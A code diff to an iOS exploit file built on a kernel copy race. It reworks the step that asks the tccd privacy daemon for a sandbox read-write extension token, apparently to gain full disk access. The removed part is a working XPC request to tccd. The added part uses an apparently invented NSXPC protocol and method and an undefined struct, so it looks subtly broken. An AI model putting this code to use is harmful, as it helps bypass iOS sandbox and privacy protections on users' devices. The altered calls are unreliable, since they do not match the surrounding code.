@@ -3,6 +3,7 @@
 @import MachO;
 
 #import <mach-o/fixup-chains.h>
+#import <xpc/xpc.h>
 // you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
 // WDBFontOverwrite
 // Also, set an NSAppleMusicUsageDescription in Info.plist (can be anything)
@@ -12,13 +13,13 @@
 #import "helpers.h"
 #import "vm_unaligned_copy_switch_race.h"
 
-typedef NSObject* xpc_object_t;
-typedef xpc_object_t xpc_connection_t;
+// Forward declarations
+static bool patchfind_ios16_7_10(void* executable_map, size_t executable_length,
+                               struct grant_full_disk_access_offsets* offsets);
+
 typedef void (^xpc_handler_t)(xpc_object_t object);
 xpc_object_t xpc_dictionary_create(const char* const _Nonnull* keys,
                                    xpc_object_t _Nullable const* values, size_t count);
-xpc_connection_t xpc_connection_create_mach_service(const char* name, dispatch_queue_t targetq,
-                                                    uint64_t flags);
 void xpc_connection_set_event_handler(xpc_connection_t connection, xpc_handler_t handler);
 void xpc_connection_resume(xpc_connection_t connection);
 void xpc_connection_send_message_with_reply(xpc_connection_t connection, xpc_object_t message,
@@ -227,53 +228,18 @@ static bool patchfind_ios16_7_10(void* executable_map, size_t executable_length,
 
 static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
     if (@available(iOS 16.7.10, *)) {
-        // Updated XPC communication for iOS 16.7.10
-        xpc_connection_t connection = xpc_connection_create_mach_service(
-            "com.apple.tccd", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 
-            XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
-        xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
-            NSLog(@"xpc event handler: %@", object);
-        });
-        xpc_connection_resume(connection);
-        const char* keys[] = {
-            "TCCD_MSG_ID",  "function",           "service", "require_purpose", "preflight",
-            "target_token", "background_session",
-        };
-        xpc_object_t values[] = {
-            xpc_string_create("17087.1"),
-            xpc_string_create("TCCAccessRequest"),
-            xpc_string_create("com.apple.app-sandbox.read-write"),
-            xpc_null_create(),
-            xpc_bool_create(false),
-            xpc_null_create(),
-            xpc_bool_create(false),
-        };
-        xpc_object_t request_message = xpc_dictionary_create(keys, values, sizeof(keys) / sizeof(*keys));
-#if 0
-        xpc_object_t response_message = xpc_connection_send_message_with_reply_sync(connection, request_message);
-        NSLog(@"%@", response_message);
-
-#endif
-        xpc_connection_send_message_with_reply(
-            connection, request_message, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
-            ^(xpc_object_t object) {
-                if (!object) {
-                    NSLog(@"object is nil???");
-                    completion(nil);
-                    return;
-                }
-                NSLog(@"response: %@", object);
-                if ([object isKindOfClass:NSClassFromString(@"OS_xpc_error")]) {
-                    NSLog(@"xpc error?");
-                    completion(nil);
-                    return;
-                }
-                NSLog(@"debug description: %@", [object debugDescription]);
-                const char* extension_string = xpc_dictionary_get_string(object, "extension");
-                NSString* extension_nsstring =
-                    extension_string ? [NSString stringWithUTF8String:extension_string] : nil;
-                completion(extension_nsstring);
-            });
+        // Use NSXPCConnection for iOS 16.7.10
+        NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.tccd" 
+                                                                             options:NSXPCConnectionPrivileged];
+        connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TCCAccessRequest)];
+        [connection resume];
+        
+        [[connection remoteObjectProxy] requestAccessForService:@"com.apple.app-sandbox.read-write"
+                                                withPurpose:nil
+                                                preflight:NO
+                                                completion:^(NSString *token, NSError *error) {
+            completion(token);
+        }];
     } else {
         // Original implementation for older iOS versions
         xpc_connection_t connection = xpc_connection_create_mach_service(
